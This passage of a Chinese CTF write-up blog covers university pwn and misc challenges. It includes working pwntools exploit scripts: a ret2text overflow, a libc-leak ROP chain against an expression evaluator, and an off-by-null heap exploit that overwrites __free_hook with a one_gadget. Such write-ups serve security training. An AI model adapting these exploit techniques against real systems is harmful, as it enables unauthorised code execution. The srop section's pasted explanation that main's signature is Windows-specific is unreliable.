!(unsigned int)num((unsigned int)buf) )</span><br><span class="line">      out();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *((_BYTE *)a1 + v3) = buf;                  // a1+v3存入buf</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall sym(char a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  LOBYTE(result) = (unsigned int)mulyt((unsigned int)a1) || (unsigned int)add((unsigned int)a1);</span><br><span class="line">  return (unsigned __int8)result;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall num(char a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  LOBYTE(result) = a1 &gt; 47 &amp;&amp; a1 &lt;= 57;</span><br><span class="line">  return (unsigned __int8)result;</span><br><span class="line">&#125;</span><br><span class="line">// v5,v4</span><br><span class="line">int __fastcall sub_E50(__int64 a1, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 v4; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  v4 = a1;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(_BYTE *)(a1 + i);</span><br><span class="line">    if ( !(unsigned int)sym((unsigned int)v3) )</span><br><span class="line">      break;</span><br><span class="line">    dep(a2, v4, i + a1);</span><br><span class="line">    if ( !(unsigned int)num((unsigned int)*(char *)(i + 1 + a1)) )</span><br><span class="line">      out();</span><br><span class="line">    sub_CB1(a2, (unsigned int)v3);</span><br><span class="line">    v4 = i + 1 + a1;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  dep(a2, v4, i + a1);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    sub_AC7(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>试运行一下程序，发现可以计算数字，但是输入负数的时候很奇怪，输入整数回的整数，多个+输出的都是0，。</p>
+<img src="/2023/10/29/gzhu-lalala/e3_4.jpg" class title="图片描述">
+
+<p>输入负数加一个数时返回的数是前面的-9输出的数加后面的数加2.</p>
+<img src="/2023/10/29/gzhu-lalala/e3_5.jpg" class title="图片描述">
+
+<p>翻找间看见这个函数，将不同的东西存入不同位置。</p>
+<img src="/2023/10/29/gzhu-lalala/e3_1.jpg" class title="图片描述">
+
+<img src="/2023/10/29/gzhu-lalala/e3_2.jpg" class title="图片描述">
+
+<p>所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[0]=运算符个数</span><br><span class="line">a[1],a2[2]=运算符</span><br><span class="line">a[3]=数字个数</span><br><span class="line">a[4.]=数字</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">#io=remote(&#x27;172.22.107.127&#x27;,49681)</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io=process(&#x27;./eval&#x27;)</span><br><span class="line">#libc=ELF(&#x27;./libc6_2.35-0ubuntu3_amd64.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;+52&#x27;)</span><br><span class="line">libc_offset = int(io.recvline()) -0x05ea90   #0x084420</span><br><span class="line">print(&#x27;libc_offset--&gt;&#x27;,hex(libc_offset))</span><br><span class="line"></span><br><span class="line">sys_addr = 	0x039680   #0x052290</span><br><span class="line">binsh =	0x135d1a	  #0x1b45bd</span><br><span class="line"></span><br><span class="line">sys=libc_offset + sys_addr</span><br><span class="line">bin_sh=libc_offset + binsh</span><br><span class="line">pop_rdi_ret=libc_offset + 0x23b6a</span><br><span class="line">ret=libc_offset + 0x22679</span><br><span class="line"></span><br><span class="line">io.sendline(f&#x27;+54+&#123;sys&#125;&#x27;.encode()) </span><br><span class="line">io.sendline(f&#x27;+53+&#123;bin_sh&#125;&#x27;.encode()) </span><br><span class="line">io.sendline(f&#x27;+52+&#123;pop_rdi_ret&#125;&#x27;.encode()) </span><br><span class="line">io.sendline(f&#x27;+51+&#123;ret&#125;&#x27;.encode()) </span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="2023新生赛"><a href="#2023新生赛" class="headerlink" title="2023新生赛"></a>2023新生赛</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>这道题我直接使用“exec 1&gt;&amp;0”修改。</p>
+<img src="/2023/10/29/gzhu-lalala/nc.jpg" class title="图片描述">
+
+<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>这道题查看一下是64位</p>
+<img src="/2023/10/29/gzhu-lalala/ret2text_3.jpg" class title="图片描述">
+
+<p>ida打开，发现有后门函数，直接解。</p>
+<img src="/2023/10/29/gzhu-lalala/ret2text_2.jpg" class title="图片描述">
+
+
+<img src="/2023/10/29/gzhu-lalala/ret2text_1.jpg" class title="图片描述">
+
+
+<img src="/2023/10/29/gzhu-lalala/ret2text_flag.jpg" class title="图片描述">
+
+
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">p=remote(&#x27;172.22.107.127&#x27;,49851)</span><br><span class="line">#p=process(&#x27;./ret2text&#x27;)</span><br><span class="line">elf=ELF(&#x27;./ret2text&#x27;)</span><br><span class="line">system=0x400687</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x70+8)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>这道题是64位<br>ida打开</p>
+<img src="/2023/10/29/gzhu-lalala/ret2libc_1.jpg" class title="图片描述">
+
+<p>有溢出，我通过puts的plt和got来泄露libc。但是由于中途开错了实例一直没打通，扇自己两耳光。<br>由于LibcSearcher的libc版本都是old对不上，于是去查了libc，用这个</p>
+<img src="/2023/10/29/gzhu-lalala/ret2libc_33.jpg" class title="图片描述">
+
+<img src="/2023/10/29/gzhu-lalala/ret2libc_flag.jpg" class title="图片描述">
+
+<p>exp:</p>
+<img src="/2023/10/29/gzhu-lalala/ret2libc_exp.jpg" class title="图片描述">
+
+
+<h3 id="烧烤"><a href="#烧烤" class="headerlink" title="烧烤"></a>烧烤</h3><p>checksec发现pie没开，nx和canary开了。</p>
+<img src="/2023/10/29/gzhu-lalala/rich_ch.jpg" class title="图片描述">
+
+<p>试运行一下,发现烧烤和啤酒买负数个会加钱。</p>
+<img src="/2023/10/29/gzhu-lalala/rich_1.jpg" class title="图片描述">
+
+
+<img src="/2023/10/29/gzhu-lalala/rich_2.jpg" class title="图片描述">
+
+
+<p>然后这道题我ida打开发现是静态，直接用ropchain构造，发现打不通，换手写。<br>发现以下函数：</p>
+<img src="/2023/10/29/gzhu-lalala/rich_3.jpg" class title="图片描述">
+
+
+<p>strpcy函数将v5复制到name，没有限制复制的字符，scanf也没有对输入的字符限制，但是v5只能容纳32个字节，存在漏洞，偏移为40.</p>
+<p>着手写exp</p>
+<img src="/2023/10/29/gzhu-lalala/rich_exp.jpg" class title="图片描述">
+
+<img src="/2023/10/29/gzhu-lalala/rich_flag.jpg" class title="图片描述">
+
+
+<h3 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h3><p>我本地通了，为什么远程打不通！<br>我用mian函数的写入然后就可以了，或许是我远程的exp没写对。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `int`: 这表明`main`函数返回一个整数值。通常情况下，返回值用于指示程序向操作系统报告的退出状态。返回值为0通常表示成功执行，而非零值可能表示错误或其他条件。</span><br><span class="line"></span><br><span class="line">- `__cdecl`: 这是一个调用约定，它指定了函数调用和参数传递的规则。`__cdecl`是在Windows系统上常用的调用约定。它通常表示函数参数从右到左被推入栈，而调用者负责在调用后清理栈。</span><br><span class="line"></span><br><span class="line">- `main`: 这是函数的名称，它是程序的入口点。在C和C++中，`main`函数是程序的执行起始点。</span><br><span class="line"></span><br><span class="line">- `int argc`: 这是一个整数参数，表示传递给程序的命令行参数的数量，包括程序自身的名称。</span><br><span class="line"></span><br><span class="line">- `const char **argv`: 这是一个指向字符串数组（字符指针数组）的指针，其中包含命令行参数。数组的每个元素都是一个C风格的字符串（以空字符结尾的字符数组），代表一个命令行参数。</span><br><span class="line"></span><br><span class="line">- `const char **envp`: 这是一个指向环境变量字符串数组的指针。环境变量是键值对，可以向程序提供信息和配置。</span><br><span class="line"></span><br><span class="line">因此，总结一下，这是在Windows系统上用于C或C++程序的典型`main`函数签名。它以命令行参数的数量（`argc`）、命令行参数字符串的数组（`argv`）以及环境变量字符串数组（`envp`）作为参数，并返回一个整数。程序可以使用这些参数在执行期间处理命令行参数并访问环境变量。</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/29/gzhu-lalala/srop_exp.jpg" class title="图片描述">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">io = process([&quot;./srop&quot;, p]):</span><br><span class="line">这行代码使用 pwntools 的 process 函数来启动一个新的进程。</span><br><span class="line">[&quot;./srop&quot;, p] 是传递给 process 函数的参数列表，其中 p 是一个自定义的有效载荷（payload），可能用于与目标程序进行交互。</span><br><span class="line">这种方式允许您将自定义参数传递给启动的进程，以便在程序执行时传递额外的数据。</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./srop&#x27;):</span><br><span class="line">这行代码也使用 process 函数来启动一个新的进程，但没有传递额外的参数。</span><br><span class="line">仅启动了目标二进制程序 ./srop，但没有传递自定义参数或有效载荷。</span><br><span class="line"></span><br><span class="line">io.sendline(p):</span><br><span class="line">一旦进程 io 被启动，这行代码将字符串 p 发送到进程的标准输入（stdin）。</span><br><span class="line">sendline 是 pwntools 中用于向进程发送文本行（带有换行符）的函数。</span><br></pre></td></tr></table></figure>
+
+
+<img src="/2023/10/29/gzhu-lalala/srop_yu.jpg" class title="图片描述">
+
+<h3 id="ez-fm"><a href="#ez-fm" class="headerlink" title="ez_fm"></a>ez_fm</h3><p>用格式化字符串漏洞泄露libc，然后写入。没打通。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="大头"><a href="#大头" class="headerlink" title="大头"></a>大头</h3><p>修改一下高度</p>
+<img src="/2023/10/29/gzhu-lalala/head_1.jpg" class title="图片描述">
+
+<img src="/2023/10/29/gzhu-lalala/head_flag.jpg" class title="图片描述">
+
+
+<h3 id="一个压缩"><a href="#一个压缩" class="headerlink" title="一个压缩"></a>一个压缩</h3><p>以为是伪加密，结果是真加密，直接用工具爆破。</p>
+<img src="/2023/10/29/gzhu-lalala/%E5%8E%8B%E7%BC%A9.jpg" class title="图片描述">
+
+<h3 id="音频受损"><a href="#音频受损" class="headerlink" title="音频受损"></a>音频受损</h3><p>音频受损拖进Audacy里查看频谱图</p>
+<img src="/2023/10/29/gzhu-lalala/%E9%9F%B3%E9%A2%91%E5%8F%97%E6%8D%9F_flag.jpg" class title="图片描述">
+
+<h3 id="顺序乱了"><a href="#顺序乱了" class="headerlink" title="顺序乱了"></a>顺序乱了</h3><p>在010editor里调换顺序得到图片,然后发现图片有问题，Linux打不开，stegsolve也打不开，做不动了。</p>
+<img src="/2023/10/29/gzhu-lalala/enc1-1.png" class title="图片描述">
+
+
+<h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><p>属性里面有序列直接解码</p>
+<img src="/2023/10/29/gzhu-lalala/welcomemisc_flag-1.jpg" class title="图片描述">
+
+<h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p>根据ida反编译查看c代码，找到off by null 漏洞。</p>
+<img src="/2023/10/29/gzhu-lalala/null.jpg" class title="图片描述">
+
+<p>libs2.27 的off by null 的思路是创建四个堆，一三为merge chunk,第二个堆以8为结尾。此题目没有edit所以用add循环修改。</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line">libc=elf(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">#io=process(&#x27;./null&#x27;)</span><br><span class="line">io=remote(&#x27;8.134.222.157&#x27;,49344)</span><br><span class="line">def debug():</span><br><span class="line">	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	io.sendline(&#x27;1&#x27;)</span><br><span class="line">	io.recvuntil(&quot;:&quot;)</span><br><span class="line">	io.sendline(str(size))</span><br><span class="line">	io.recvuntil(&quot;:&quot;)</span><br><span class="line">	io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	io.sendline(&#x27;2&#x27;)</span><br><span class="line">	io.recvuntil(&quot;:&quot;)</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	</span><br><span class="line">def delete(index):</span><br><span class="line">	io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	io.sendline(&#x27;3&#x27;)</span><br><span class="line">	io.recv()</span><br><span class="line">	io.sendline(str(index))</span><br><span class="line">	</span><br><span class="line">add(0x4f0,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x48,&#x27;bbbb&#x27;)</span><br><span class="line">add(0x4f0,&#x27;cccc&#x27;)</span><br><span class="line">add(0x10,&#x27;dddd&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">add(0x48,&#x27;e&#x27;*0x48)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add((0x47-i),&#x27;f&#x27;*(0x47-i))</span><br><span class="line">    delete(0)</span><br><span class="line">    </span><br><span class="line">add(0x48,b&#x27;g&#x27;*0x40+p64(0x550))</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">add(0x4f0,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">leak_libc_addr=u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;leak_libc_addr&#x27;)</span><br><span class="line">libc_base_addr=leak_libc_addr-0x3ebca0</span><br><span class="line">print(&#x27;libc_base_addr&#x27;)</span><br><span class="line">free_hook_addr=libc_base_addr+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">print(&#x27;free_hook_addr&#x27;)</span><br><span class="line">one_gadget=[0x4f2a5,0x4f302,0x10a2fc]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[1]</span><br><span class="line">add(0x50,&#x27;aaaa&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x50,p64(free_hook_addr))</span><br><span class="line">add(0x50,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x50,p64(one_gadget))</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">#debug()</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E9%83%A8%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第一次内部赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-migrate2"><span class="toc-number">1.1.</span> <span class="toc-text">easy_migrate2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-migration2"><span class="toc-number">1.2.</span> <span class="toc-text">easy_migration2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hard-eval"><span class="toc-number">1.3.</span> <span class="toc-text">hard_eval</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">2023新生赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">2.1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nc"><span class="toc-number">2.1.1.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">2.1.2.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">2.1.3.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%A7%E7%83%A4"><span class="toc-number">2.1.4.</span> <span class="toc-text">烧烤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srop"><span class="toc-number">2.1.5.</span> <span class="toc-text">srop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-fm"><span class="toc-number">2.1.6.</span> <span class="toc-text">ez_fm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%A4%B4"><span class="toc-number">2.2.1.</span> <span class="toc-text">大头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%8E%8B%E7%BC%A9"><span class="toc-number">2.2.2.</span> <span class="toc-text">一个压缩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E5%8F%97%E6%8D%9F"><span class="toc-number">2.2.3.</span> <span class="toc-text">音频受损</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%E4%B9%B1%E4%BA%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">顺序乱了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome"><span class="toc-number">2.2.5.</span> <span class="toc-text">welcome</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024"><span class="toc-number">3.</span> <span class="toc-text">2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">null</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&text=gzhu_lalala"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&is_video=false&description=gzhu_lalala"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=gzhu_lalala&body=Check out this article: https://gl-zhou.github.io/2023/10/29/gzhu-lalala/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&title=gzhu_lalala"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&name=gzhu_lalala&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/10/29/gzhu-lalala/&t=gzhu_lalala"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
